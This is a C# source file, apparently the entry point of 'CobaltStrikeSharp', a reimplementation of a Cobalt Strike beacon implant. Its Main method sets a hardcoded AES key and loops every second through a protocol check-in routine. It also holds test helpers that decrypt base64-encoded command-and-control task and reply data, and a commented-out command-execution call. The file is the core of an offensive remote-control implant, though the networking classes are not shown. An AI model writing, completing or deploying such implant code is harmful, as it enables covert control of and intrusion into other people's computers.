using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;

namespace CobaltStrikeSharp
{
    static class Program
    {
        /// <summary>
        /// 应用程序的主入口点。
        /// </summary>
        [STAThread]

       

        public static byte[] StringToByteArray(string hex)
        {
            return Enumerable.Range(0, hex.Length)
                             .Where(x => x % 2 == 0)
                             .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
                             .ToArray();
        }

        public static void test()
        {
            Type classType = Type.GetType("System.IO.StreamWriter");
            StreamWriter a = (StreamWriter)Activator.CreateInstance(classType, "d:\\xxx.txt");
            a.Write("a");
            a.Close();
        }

        static void testDecodeTask()
        {
            String bstr = "";
            byte[] tmpa = System.Convert.FromBase64String(bstr);
            byte[] tmp = new byte[tmpa.Length - 16];
            Array.Copy(tmpa, 0, tmp, 0, tmpa.Length - 16);
            byte[] b = Crypto.AESDecrypt(tmp);
        }

        static void testDecodeReply()
        {
            String bstr = "AAAAUKTfR/1sPmWcV/eRFOZjhzopgeUj29hmj1cJ6ASPqS/1gTpajfIKu+izJg795zpRkUdJx0hGQ6FcW34DP60JEp4pbGeFGa62DfU1bJo0CtKLAAAAUIBl4aGHm8pkjvwUIqGuk0Wm45jv72rk2y13OfDQRWgODIktnqBoyBcM4zueQwDlozskRtFf33+yyt8vRVGXc4ZcuWn6h7S59Qfyovq1wlZuAAAAMHNChv7yCylBaDGR8b2aYblk2Wa8C1tkh8BxFW7h8BgGPXVKwPpSOGFncfP+q7Tj9Q==";
            byte[] tmpa = System.Convert.FromBase64String(bstr);
            byte[] tmp = new byte[80];
            Array.Copy(tmpa, 84+4, tmp, 0, 80);
            byte[] b = Crypto.AESDecrypt(tmp);
        }
        static void Main()
        {
            
            Crypto.Key = StringToByteArray("d9b5409984ac32c21fdc1116698f3ccf");
            testDecodeReply();
            while (true)
            {
                Protocol.init();
                Protocol.run();
                Thread.Sleep(1000);
            }
           

            //Util.execCmd("", "");



            //Application.EnableVisualStyles();
            //Application.SetCompatibleTextRenderingDefault(false);
            //Application.Run(new Main());
        }
    }
}
